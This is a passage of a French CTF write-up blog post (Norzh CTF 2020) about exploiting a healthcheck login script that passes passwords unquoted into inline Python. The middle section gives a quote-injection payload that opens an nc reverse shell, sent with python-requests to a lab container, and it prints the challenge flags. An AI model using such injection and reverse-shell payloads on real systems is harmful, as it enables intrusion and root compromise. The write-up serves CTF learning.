+</span></span><span class="line"><span class="cl"><span class="nv">username</span><span class="o">=</span><span class="nv">$1</span>
+</span></span><span class="line"><span class="cl"><span class="nv">PASSWORD</span><span class="o">=</span><span class="nv">$2</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">IFS</span><span class="o">=</span><span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">shadow_line</span><span class="o">=</span><span class="k">$(</span>cat /etc/shadow <span class="p">|</span> grep <span class="nv">$1</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl">python3 -c <span class="s2">&#34;import crypt;salt=&#39;</span><span class="nv">$shadow_line</span><span class="s2">&#39;.split(&#39;\$6\$&#39;)[1].split(&#39;</span>$<span class="s2">&#39;)[0];hash = crypt.crypt(&#39;</span><span class="nv">$PASSWORD</span><span class="s2">&#39;, &#39;\$6\$&#39;+salt+&#39;</span>$<span class="s2">&#39;);print(hash == &#39;</span><span class="nv">$shadow_line</span><span class="s2">&#39;.split(&#39;:&#39;)[1],end=&#39;&#39;)&#34;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>On se retrouve donc face à un script plutôt&hellip; Sale. Mais intéréssant !</p>
+<p>En effet, le script va :</p>
+<ul>
+<li>Récupérer notre couple username / password et les mettre dans des variables</li>
+<li>Extraire dans le fichier shadow le hash du mot de passe de l&rsquo;utilisateur</li>
+<li>Lancer du python en ligne de commande qui va hasher notre mot de passe et comparer son hash avec celui récupéré</li>
+</ul>
+<p>Les variables étant passées en ligne de commande pour le python, s&rsquo;il y a des quotes elles seront interprétées. On a donc ici notre injection sur la variable <strong>$PASSWORD</strong>. Il faudra :</p>
+<ul>
+<li>Ouvrir une quote</li>
+<li>Compléter la fonction <em>crypt.crypt()</em> pour éviter une erreur</li>
+<li>Ajouter le code que l&rsquo;on veut executer</li>
+<li>Commenter le reste du code python</li>
+</ul>
+<p>On se trouve avec une payload comme suit :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39;,&#39;&#39;);import os;os.system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;IP&gt; &lt;PORT&gt; &gt;/tmp/f&#39;)#</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Et pour faire ma requête, afin de ne pas m&rsquo;embêter avec le basic-auth, je vais utiliser python-requests.</p>
+<p>J&rsquo;ouvre donc un listener :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -nlvp <span class="m">51338</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;http://localhost:3000/ping&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                 <span class="n">data</span><span class="o">=</span><span class="p">{},</span> 
+</span></span><span class="line"><span class="cl">                 <span class="n">auth</span><span class="o">=</span><span class="p">(</span><span class="s2">&#34;root&#34;</span><span class="p">,</span><span class="s2">&#34;&#39;,&#39;&#39;);import os;os.system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;IP&gt; &lt;PORT&gt; &gt;/tmp/f&#39;)#&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="p">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Malheureusement, cette première requête n&rsquo;a pas fonctionné&hellip; Je fais donc d&rsquo;autre test en remplaçant le user <strong>root</strong> par <strong>web-dev</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;http://localhost:3000/ping&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                 <span class="n">data</span><span class="o">=</span><span class="p">{},</span>
+</span></span><span class="line"><span class="cl">                 <span class="n">auth</span><span class="o">=</span><span class="p">(</span><span class="s2">&#34;web-dev&#34;</span><span class="p">,</span><span class="s2">&#34;&#39;,&#39;&#39;);import os;os.system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 172.17.0.1 51338 &gt;/tmp/f&#39;)#&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="p">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Et on obtient bien un shell root. On repète notre petite liste de commandes pour obtenir notre shell interactif puis on va lire le flag.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ <span class="nb">cd</span> 
+</span></span><span class="line"><span class="cl">$ cat flag
+</span></span><span class="line"><span class="cl">ENSIBS<span class="o">{</span>JesappelleRoot<span class="o">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Et de 3 challs validés !</p>
+<p>On peut d&rsquo;ailleurs voir pourquoi la commande ne fonctionnait pas avec l&rsquo;utilisateur root : On est dans un docker et le root n&rsquo;a pas de mot de passe.</p>
+<p><img loading="lazy" src='/img/Nuclea_shadow_root.png' alt="/etc/shadow, ligne du root"></p>
+<p>Le script s&rsquo;arrêtait donc sûrement avant l&rsquo;execution du python.</p>
+<h2 class="heading-element" id="trouver-le-mot-de-passe-de-web-dev"><span>Trouver le mot de passe de web-dev</span>
+  <a href="#trouver-le-mot-de-passe-de-web-dev" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>Ici, on se trouve face à un cas un peu spécifique&hellip; En général on trouve le mot de passe d&rsquo;un utilisateur puis on s&rsquo;en sert pour se connecter. Là le but final est de trouver ce mot de passe.</p>
+<p>Le mot de passe étant le flag (probablement), casser le hash de <em>/etc/shadow</em> serait impossible puisqu&rsquo;il ne sera pas dans une wordlist.</p>
+<p>La première idée qui me vient serait donc de vérifier dans tous les fichiers de configuration si la mention <strong>ENSIBS</strong> apparaît quelque part. Pour cela, rien de plus simple qu&rsquo;un grep.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ <span class="nb">cd</span> /
+</span></span><span class="line"><span class="cl">$ grep -lR <span class="s1">&#39;ENSIBS{&#39;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Mais après discussion avec le créateur du challenge, c&rsquo;est inutile. Le flag n&rsquo;est pas simplement caché sur le serveur.</p>
+<p>Je vois donc 2 possibilités :</p>
+<ul>
+<li>Le flag est chiffré quelque part</li>
+<li>Le flag est à l&rsquo;exterieur du serveur</li>
+</ul>
+<p>Au bout de 5min de réflexion intense, j&rsquo;ai l&rsquo;illumination : Le serveur sur le port 3000 est un serveur de &ldquo;healthcheck&rdquo; c&rsquo;est à dire que les utilisateurs vont se connecter assez régulièrement vérifier qu&rsquo;il est encore en vie et que tout fonctionne comme il faut.</p>
+<p>Donc l&rsquo;utilisateur web-dev fera sûrement des requêtes où il va s&rsquo;authentifier, et son mot de passe apparaîtra dans les processus en argument de authent.sh ou dans la ligne de commande python.</p>
+<p>Je récupère donc un outil magique : <a href="https://github.com/DominicBreuker/pspy"target="_blank" rel="external nofollow noopener noreferrer"><strong>pspy</strong></a>, un executable qui affiche les processus en temps réel avec leurs arguments.</p>
+<p>Je le lance et je vois très vite le saint graal.</p>
+<p><img loading="lazy" src='/img/Nuclea_get_password.png' alt="Mot de passe de web-dev"></p>
+<p>Son mot de passe est donc le quatrième flag</p>
+<blockquote>
+<p>ENSIBS{I_kn0w_Ur_passWord_Web_dev}</p></blockquote>
+<h2 class="heading-element" id="retour-sur-le-scénario"><span>Retour sur le scénario</span>
+  <a href="#retour-sur-le-sc%c3%a9nario" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>J&rsquo;ai trouvé ce scénario très intéréssant, il m&rsquo;a fait travailler sur des technos sur lesquelles je ne tape pas souvent (voire jamais) comme GraphQL ou node.js. Je me suis donc bien amusé et il a pu nous rapporter un total de 1000 points (250 par challenge), ce qui n&rsquo;est pas negligeable.</p>
+<p>Cependant les parties 2 &amp; 3 étaient quelque chose de &ldquo;custom&rdquo; de façon un peu trop flagrante ce qui peut un peu enlever au réalisme voulu par le CTF.</p>
+<p>Malgré tout, bravo aux organisateurs et particulièrement à <a href="https://twitter.com/Areizen_"target="_blank" rel="external nofollow noopener noreferrer">Areizen</a> pour ce scénario.</p>
+</div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Mis à jour le 2025-07-11 11:49:04">Mis à jour le 2025-07-11&nbsp;</span>
+      </div><div class="post-info-license">
+            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
+          </div></div><div class="post-info-line">
+        <div class="post-info-md"><span><a href="/posts/nuclea-web-extranet/index.md" title="Ouvrir le Markdown" class="link-to-markdown">Ouvrir le Markdown</a></span></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="Partager via X" data-sharer="twitter" data-url="https://driikolu.fr/posts/nuclea-web-extranet/" data-title="Norzh CTF 2020 - Extranet Norzh Nuclea" data-via="driikolu"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Partager via Facebook" data-sharer="facebook" data-url="https://driikolu.fr/posts/nuclea-web-extranet/"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Partager via 微博" data-sharer="weibo" data-url="https://driikolu.fr/posts/nuclea-web-extranet/" data-title="Norzh CTF 2020 - Extranet Norzh Nuclea"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Retour</a></span>&nbsp;|&nbsp;<span><a href="/">Accueil</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/posts/install_arch_uefi/" class="post-nav-item" rel="next" title="Installation D&#39;Archlinux en UEFI &amp; Chiffré">Installation D&#39;Archlinux en UEFI &amp; Chiffré<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contenus"><h2 class="toc-title">Contenus&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Propulsé par <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.147.9"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> | Thème - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.20"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">
+              <a href="https://x.com/driikolu"target="_blank" rel="external nofollow noopener noreferrer">Driikolu</a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Retour en Haut"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">Ce site Web fonctionne mieux quand JavaScript est activé.</div>
+  </noscript>
+</div><link rel="preload" href="/lib/katex/katex.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"Copier dans le presse-papiers","editLockTitle":"Verrouiller le bloc de code modifiable","editUnLockTitle":"Déverrouiller le bloc de code modifiable","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"J'ai compris !","link":"En apprendre plus","message":"Ce site Web utilise des Cookies pour améliorer votre expérience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/search.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"Aucun résultat trouvé","snippetLength":30,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"version":"v0.3.20"};</script><script src="/js/theme.min.js" defer></script><script src="/js/custom.min.js" defer></script></body>
+</html>
